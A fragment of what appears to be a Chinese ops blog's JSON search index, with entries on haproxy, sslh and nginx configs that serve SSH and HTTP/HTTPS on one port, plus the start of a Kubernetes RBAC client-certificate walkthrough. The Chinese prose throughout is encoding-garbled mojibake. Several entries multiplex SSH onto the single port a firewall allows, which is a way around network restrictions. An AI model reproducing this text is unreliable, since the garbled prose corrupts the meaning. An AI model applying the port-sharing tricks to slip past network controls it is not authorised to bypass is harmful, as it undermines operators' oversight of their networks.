\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬ä»¥ alphine:3.12 ä¸ºåº•ç‰ˆï¼Œç„¶åä¸‹è½½ filebeat  7.15.1çš„äºŒè¿›åˆ¶åŒ…å¹¶é‡Šæ”¾åˆ° /opt ä¸‹ï¼Œæœ€åæŒ‡å®šå…¥å£æ–‡ä»¶ /docker-entrypoint.sh\u003c/p\u003e","title":"kubernetesç”Ÿäº§ç¯å¢ƒä½¿ç”¨filebeat sidecaræ”¶é›†æ—¥å¿—"},{"content":"æˆ‘ä»¬é€‰æ‹© haproxy 1.8 ç‰ˆæœ¬ä»¥ä¸Šçš„ï¼Œç¼–è¯‘å®‰è£…åˆ°è·¯å¾„ /export/servers/haproxy\nmake TARGET=linux2628 PREFIX=/export/servers/haproxy USE_GETADDRINFO=1 USE_ZLIB=1 USE_REGPARM=1 USE_OPENSSL=1 \\ USE_SYSTEMD=1 USE_PCRE=1 USE_PCRE_JIT=1 USE_NS=1 make install PREFIX=/export/servers/haproxy ç¼–è¾‘ haproxy.conf é…ç½®æ–‡ä»¶ï¼š\nglobal maxconn 5120 chroot /export/servers/haproxy daemon quiet nbproc 2 pidfile /tmp/haproxy.pid defaults timeout connect 5s timeout client 50s timeout server 20s listen http bind :80 timeout client 1h tcp-request inspect-delay 2s acl is_http req_proto_http tcp-request content accept if is_http server server-http :8080 use_backend ssh if !is_http backend ssh mode tcp timeout server 1h server server-ssh :22 è§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬åœ¨ 8080 ç«¯å£å¼€äº† http æœåŠ¡ï¼Œåœ¨ 22 ç«¯å£å¼€äº† ssh æœåŠ¡ï¼Œ80ç«¯å£ç”± haproxy åšä»£ç†è½¬å‘ï¼Œé¦–å…ˆåˆ¤æ–­å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦æ˜¯ http è¯·æ±‚ï¼Œå¦‚æœæ˜¯å°±è½¬å‘åˆ° 8080 ç«¯å£ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±è½¬å‘åˆ° 22 ç«¯å£ï¼Œè¿™æ ·å°±å®ç°äº† 80 ç«¯å£åŒæ—¶è·‘ http å’Œ ssh ä¸¤ä¸ªæœåŠ¡ã€‚\n","permalink":"https://rendoumi.com/posts/20211110-haproxy_multiple_port/","summary":"\u003cp\u003eæˆ‘ä»¬é€‰æ‹© haproxy 1.8 ç‰ˆæœ¬ä»¥ä¸Šçš„ï¼Œç¼–è¯‘å®‰è£…åˆ°è·¯å¾„ /export/servers/haproxy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003eTARGET\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux2628 \u003cspan class=\"nv\"\u003ePREFIX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/haproxy \u003cspan class=\"nv\"\u003eUSE_GETADDRINFO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_ZLIB\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_REGPARM\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_OPENSSL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"nv\"\u003eUSE_SYSTEMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE_JIT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_NS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install \u003cspan class=\"nv\"\u003ePREFIX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/haproxy\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘ haproxy.conf é…ç½®æ–‡ä»¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eglobal \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003emaxconn 5120  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003echroot /export/servers/haproxy   \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003edaemon \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003equiet \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003enbproc 2 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003epidfile /tmp/haproxy.pid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edefaults \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout connect 5s \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout client 50s \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout server 20s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elisten http \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003ebind :80 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout client 1h \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etcp-request inspect-delay 2s \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eacl is_http req_proto_http \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etcp-request content accept if is_http \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eserver server-http :8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003euse_backend ssh if !is_http\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebackend ssh \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003emode tcp \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout server 1h \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eserver server-ssh :22\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬åœ¨ 8080 ç«¯å£å¼€äº† http æœåŠ¡ï¼Œåœ¨ 22 ç«¯å£å¼€äº† ssh æœåŠ¡ï¼Œ80ç«¯å£ç”± haproxy åšä»£ç†è½¬å‘ï¼Œé¦–å…ˆåˆ¤æ–­å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦æ˜¯ http è¯·æ±‚ï¼Œå¦‚æœæ˜¯å°±è½¬å‘åˆ° 8080 ç«¯å£ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±è½¬å‘åˆ° 22 ç«¯å£ï¼Œè¿™æ ·å°±å®ç°äº† 80 ç«¯å£åŒæ—¶è·‘ http å’Œ ssh ä¸¤ä¸ªæœåŠ¡ã€‚\u003c/p\u003e","title":"haproxyä¸€ä¸ªç«¯å£è·‘å¤šä¸ªæœåŠ¡"},{"content":"Ucloudçš„æœºå™¨åœ¨ä¸¤ä¼šæœŸé—´å¹²è„†ç«¯å£å…¨ç­ï¼Œfirewallè®¾ç½®è¿›æ¥çš„ç«¯å£å…¨å…³é—­ï¼ï¼ï¼ï¼ï¼ï¼\nè¿˜å¥½æœ‰ä¸ªGlobal sshçš„æœåŠ¡ï¼Œå¯ä»¥ ssh ubuntu@111.129.37.89.ipssh.net\nç™»å½•ä¸Šå»ï¼Œæ³¨æ„ï¼Œç›´æ¥ssh ubuntu@111.129.37.89æ˜¯ä¸é€šçš„ã€‚\né‚£æˆ‘ä»¬å°±æ­å»ºä¸€ä¸ªSSLHæœåŠ¡ï¼Œå¯ä»¥æŠŠsshå’Œopenvpnä»¥åŠsslæœåŠ¡ç»Ÿç»Ÿå¡åˆ°ä¸€ä¸ªç«¯å£22é‡Œ\nåŠ¨æ‰‹å§\n1ã€ä¿®æ”¹opensshçš„ç«¯å£ ä»22ç«¯å£æ”¹æˆ2222ï¼Œåƒä¸‡åˆ«é‡å¯ï¼Œ22è¿™ä¼šå…ˆå¾—å½’sshç”¨\n2ã€å®‰è£…sslh\nsudo apt install sslh vi /etc/default/sslh æ‰¾åˆ°Run=no æ”¹æˆRun=yes ç„¶ååˆ°ä¸‹é¢ï¼ŒæŒ‰éœ€é…ç½®ï¼ˆä¸è·‘443çš„è¯å¯ä»¥ä¸é…ï¼‰ DAEMON_OPTS=\u0026#34;--user sslh --listen 0.0.0.0:22 --ssh 127.0.0.1:2222 --ssl 127.0.0.1:443 --openvpn 127.0.0.1:1194 --pidfile /var/run/sslh/sslh.pid --timeout 5\u0026#34; 3ã€é…ç½®sslhå¹¶ä¸”é‡å¯æœåŠ¡å™¨\nsudo systemctl enable sslh sudo reboot å°±æå®šäº†\n","permalink":"https://rendoumi.com/posts/20211110-sslh_multiple_port/","summary":"\u003cp\u003eUcloudçš„æœºå™¨åœ¨ä¸¤ä¼šæœŸé—´å¹²è„†ç«¯å£å…¨ç­ï¼Œfirewallè®¾ç½®è¿›æ¥çš„ç«¯å£å…¨å…³é—­ï¼ï¼ï¼ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eè¿˜å¥½æœ‰ä¸ªGlobal sshçš„æœåŠ¡ï¼Œå¯ä»¥ ssh \u003ca href=\"mailto:ubuntu@111.129.37.89.ipssh.net\"\u003eubuntu@111.129.37.89.ipssh.net\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç™»å½•ä¸Šå»ï¼Œæ³¨æ„ï¼Œç›´æ¥ssh \u003ca href=\"mailto:ubuntu@111.129.37.89\"\u003eubuntu@111.129.37.89\u003c/a\u003eæ˜¯ä¸é€šçš„ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æˆ‘ä»¬å°±æ­å»ºä¸€ä¸ªSSLHæœåŠ¡ï¼Œå¯ä»¥æŠŠsshå’Œopenvpnä»¥åŠsslæœåŠ¡ç»Ÿç»Ÿå¡åˆ°ä¸€ä¸ªç«¯å£22é‡Œ\u003c/p\u003e\n\u003cp\u003eåŠ¨æ‰‹å§\u003c/p\u003e\n\u003cp\u003e1ã€ä¿®æ”¹opensshçš„ç«¯å£ ä»22ç«¯å£æ”¹æˆ2222ï¼Œåƒä¸‡åˆ«é‡å¯ï¼Œ22è¿™ä¼šå…ˆå¾—å½’sshç”¨\u003c/p\u003e\n\u003cp\u003e2ã€å®‰è£…sslh\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install sslh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/default/sslh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eæ‰¾åˆ°Run\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eæ”¹æˆRun\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç„¶ååˆ°ä¸‹é¢ï¼ŒæŒ‰éœ€é…ç½®ï¼ˆä¸è·‘443çš„è¯å¯ä»¥ä¸é…ï¼‰\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDAEMON_OPTS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--user sslh --listen 0.0.0.0:22 --ssh 127.0.0.1:2222 --ssl 127.0.0.1:443 --openvpn 127.0.0.1:1194 --pidfile /var/run/sslh/sslh.pid --timeout 5\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3ã€é…ç½®sslhå¹¶ä¸”é‡å¯æœåŠ¡å™¨\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo systemctl enable sslh\nsudo reboot\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå°±æå®šäº†\u003c/p\u003e","title":"sslhçš„ä¸€ä¸ªç«¯å£åŒæ—¶è·‘å¤šä¸ªæœåŠ¡"},{"content":"è¿™ä¸ªè¦æ±‚æŒºå¤æ€ªçš„ï¼ŒèƒŒæ™¯æ˜¯é˜²ç«å¢™åªå¼€äº† nginx 443 ç«¯å£ã€‚æˆ‘ä¹Ÿæƒ³åŒæ—¶ ssh ç™»å½•è¿›å»ï¼Œä½†æ˜¯F5æ²¡å¼€IP\nå°±åªèƒ½è¿™ä¹ˆå¹²äº†ï¼Œè®© Nginx ä¸€ä¸ªç«¯å£è·‘å¤šä¸ªæœåŠ¡\nåœ¨ nginx.conf åŠ ä¸€æ®µï¼Œstream é…ç½®ï¼Œnginx çš„ ip æ˜¯ 192.168.8.110ï¼š\n#Multi Ports stream { upstream ssh { server 192.168.8.112:22; } upstream https { server 192.168.8.111:443; } map $ssl_preread_protocol $upstream { default ssh; \u0026#34;TLSv1.2\u0026#34; https; \u0026#34;TLSv1.3\u0026#34; https; \u0026#34;TLSv1.1\u0026#34; https; \u0026#34;TLSv1.0\u0026#34; https; } # SSH and SSL on the same port server { listen 443; proxy_pass $upstream; ssl_preread on; } } æµ‹è¯•ä¸€ä¸‹ï¼š\ncurl -v https://192.168.8.110 ssh 192.168.8.110 -p 443 è¿™æ ·å°±å¯ä»¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20211109-nginx_multiple_port/","summary":"\u003cp\u003eè¿™ä¸ªè¦æ±‚æŒºå¤æ€ªçš„ï¼ŒèƒŒæ™¯æ˜¯é˜²ç«å¢™åªå¼€äº† nginx 443 ç«¯å£ã€‚æˆ‘ä¹Ÿæƒ³åŒæ—¶ ssh ç™»å½•è¿›å»ï¼Œä½†æ˜¯F5æ²¡å¼€IP\u003c/p\u003e\n\u003cp\u003eå°±åªèƒ½è¿™ä¹ˆå¹²äº†ï¼Œè®© Nginx ä¸€ä¸ªç«¯å£è·‘å¤šä¸ªæœåŠ¡\u003c/p\u003e\n\u003cp\u003eåœ¨ nginx.conf åŠ ä¸€æ®µï¼Œstream é…ç½®ï¼Œnginx çš„ ip æ˜¯ 192.168.8.110ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Multi Ports\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estream {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eupstream ssh {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eserver 192.168.8.112:22;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eupstream https {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eserver 192.168.8.111:443;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emap $ssl_preread_protocol $upstream {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003edefault ssh;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.2\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.3\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.1\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.0\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# SSH and SSL on the same port\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eserver {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003elisten 443;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eproxy_pass $upstream;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003essl_preread on;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæµ‹è¯•ä¸€ä¸‹ï¼š\u003c/p\u003e","title":"Nginxçš„ä¸€ä¸ªç«¯å£åŒæ—¶è·‘SSHå’ŒHTTPSæœåŠ¡"},{"content":"kubernetes è£…å¥½æ­£å¸¸è¿è¡Œä¸€æ®µæ—¶é—´åï¼Œä¼šå‡ºç°è¦æŠŠç ”å‘å’Œè¿ç»´æƒé™åˆ†å¼€çš„åœºæ™¯ï¼š\næ¯”å¦‚ï¼š\nç»™æŸä¸ªç”¨æˆ·æŸä¸€æŒ‡å®šåç§°ç©ºé—´ä¸‹çš„ç®¡ç†æƒé™ ç»™ç”¨æˆ·èµ‹äºˆé›†ç¾¤çš„åªè¯»æƒé™ â€¦ éå¸¸éº»çƒ¦ï¼Œæˆ‘ä»¬è¿™é‡Œä¸è®¨è®ºè¿‡å¤šçš„æ¦‚å¿µï¼Œä»è¿ç»´çš„è§’åº¦å‡ºå‘ï¼Œç®€å•å®ç”¨åŒ–\næˆ‘ä»¬éœ€è¦æ˜ç¡®ä¸‰ä¸ªRBACæœ€åŸºæœ¬çš„æ¦‚å¿µ\nRole: è§’è‰²ï¼Œå®ƒå®šä¹‰äº†ä¸€ç»„è§„åˆ™ï¼Œå®šä¹‰äº†ä¸€ç»„å¯¹Kubernetes APIå¯¹è±¡çš„æ“ä½œæƒé™ RoleBinding: å®šä¹‰äº†\u0026quot;è¢«ä½œç”¨è€…\u0026quot;å’Œ\u0026quot;è§’è‰²\u0026quot;çš„ç»‘å®šå…³ç³» Subject: è¢«ä½œç”¨è€…ï¼Œæ—¢å¯ä»¥æ˜¯\u0026quot;äºº\u0026quot;ï¼Œä¹Ÿå¯ä»¥æ˜¯æœºå™¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ Kubernetes ä¸­å®šä¹‰çš„ç”¨æˆ·(ServiceAccountä¸»è¦è´Ÿè´£kuberneteså†…ç½®ç”¨æˆ·) æˆ‘ä»¬çš„æ“ä½œè¿‡ç¨‹æµç¨‹å¦‚ä¸‹ï¼Œé¦–å…ˆåˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦ï¼›å…¶æ¬¡åˆ›å»ºRoleè§’è‰²ï¼›å†åˆ›å»ºRoleBindingï¼ŒæŠŠSubjectå’ŒRoleç»‘å®šï¼Œå°±å®Œäº‹äº†ï¼›æœ€åä¸€æ­¥æ˜¯ç”Ÿæˆ kubectl çš„é…ç½®æ–‡ä»¶ã€‚\nä¸€ã€åˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦ æˆ‘ä»¬ä»¥å·²å»ºå¥½çš„é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ–è€…è‡ªå»ºå¥½çš„ Kubernetes ä¹Ÿè¡Œï¼›ç¡®å®šå·²ç»æœ‰äº† .kube/config é…ç½®æ–‡ä»¶ï¼Œæ‹¥æœ‰é›†ç¾¤æœ€é«˜æƒé™ï¼Œå¹¶ä¸”å¯ä»¥æ­£å¸¸æ‰§è¡Œ kubectl å‘½ä»¤ã€‚\né¦–å…ˆæ˜¯ç”Ÿæˆè¯ä¹¦ï¼Œå¹¶å‘é›†ç¾¤æå‡ºè¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n#!/bin/sh useraccount=reader openssl req -new -newkey rsa:4096 -nodes -keyout $useraccount-k8s.key -out $useraccount-k8s.csr -subj \u0026#34;/CN=$useraccount/O=devops\u0026#34; csr=$(cat $useraccount-k8s.csr | base64 | tr -d \u0026#39;\\n\u0026#39;) cat \u0026lt;\u0026lt; EOF \u0026gt; k8s-csr.yaml apiVersion: certificates.k8s.io/v1beta1 kind: CertificateSigningRequest metadata: name: $useraccount-k8s-access spec: groups: - system:authenticated request: $csr usages: - client auth EOF kubectl create -f k8s-csr.yaml kubectl certificate approve $useraccount-k8s-access kubectl get csr $useraccount-k8s-access -o jsonpath=\u0026#39;{.status.certificate}\u0026#39; | base64 --decode \u0026gt; $useraccount-k8s-access.crt kubectl config view -o jsonpath=\u0026#39;{.clusters[0].cluster.certificate-authority-data}\u0026#39; --raw | base64 --decode - \u0026gt; k8s-ca.crt è§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·CN=readerï¼Œç„¶åå‘é›†ç¾¤å‘é€äº†è¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œæœ€ç»ˆä»é›†ç¾¤è·å¾—äº† reader-k8s-access.crt çš„å®¢æˆ·ç«¯è¯ä¹¦å’Œ k8s-ca.crt çš„ CA è¯ä¹¦ã€‚\nk8s-csr.yaml å’Œ reader-k8s.csr éƒ½æ˜¯ä¸­é—´äº§ç‰©ï¼Œæœ€ç»ˆæˆ‘ä»¬æœ‰äº†å®¢æˆ·ç«¯ç§é’¥ reader-k8s.key ï¼Œå®¢æˆ·ç«¯è¯ä¹¦ reader-k8s-access.crt ï¼ŒCA è¯ä¹¦ k8s-ca.crt è¿™ä¸‰ä¸ªæœ‰ç”¨çš„æ–‡ä»¶ã€‚\näºŒã€åˆ›å»º Role è§’è‰² cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; role.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: role-pods_reader namespace: default rules: - apiGroups: - \u0026#34;\u0026#34; resources: - pods - pods/log verbs: - get - list - watch EOF kubectl apply -f role.yaml è§£é‡Šï¼šæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª role è§’è‰²ï¼Œåå­—å«åš role-pods_readerï¼Œæ‰€å±å‘½åç©ºé—´æ˜¯ default ï¼Œå®ƒå¯¹ pods å’Œ pods/log 